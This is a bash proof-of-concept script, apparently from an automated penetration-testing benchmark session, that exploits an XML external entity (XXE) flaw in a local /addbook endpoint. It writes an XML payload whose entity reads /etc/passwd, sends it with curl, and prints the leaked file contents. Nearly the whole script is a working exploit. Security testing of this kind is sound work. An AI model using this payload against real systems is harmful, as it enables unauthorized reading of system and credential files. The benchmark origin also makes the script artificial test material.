#!/bin/bash
# POC: XXE File Disclosure vulnerability - demonstrates arbitrary file read via XML external entity injection on /addbook endpoint
# Target: ./repo
# Created: 2025-12-01T16:01:10.548Z
# Session: benchmark-XBEN-096-24-minc08hf

# XXE File Disclosure POC - /etc/passwd Read
# Target: http://localhost:5000/addbook
# Vulnerability: XML External Entity Injection allowing arbitrary file disclosure

TARGET_URL="http://localhost:5000/addbook"
XXE_PAYLOAD_FILE="/tmp/xxe_payload.xml"

# Create XXE payload XML with external entity pointing to /etc/passwd
cat > "$XXE_PAYLOAD_FILE" << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<book>&xxe;</book>
EOF

echo "[*] XXE File Disclosure POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload File: $XXE_PAYLOAD_FILE"
echo ""
echo "[*] Sending XXE payload..."
echo ""

# Send the payload to the vulnerable endpoint
RESPONSE=$(curl -s -X POST "$TARGET_URL" --data-urlencode "xml@$XXE_PAYLOAD_FILE")

# Check if response contains /etc/passwd content (evidence of XXE)
if echo "$RESPONSE" | grep -q "root:"; then
    echo "[+] VULNERABILITY CONFIRMED: XXE File Disclosure"
    echo "[+] Server returned /etc/passwd contents in response"
    echo ""
    echo "[*] Response:"
    echo "$RESPONSE"
    echo ""
    echo "[+] Extracted /etc/passwd content:"
    echo "$RESPONSE" | grep -E "(root|daemon|bin|sys|sync)" | head -5
    exit 0
else
    echo "[-] No /etc/passwd content detected in response"
    echo "[*] Full Response:"
    echo "$RESPONSE"
    exit 1
fi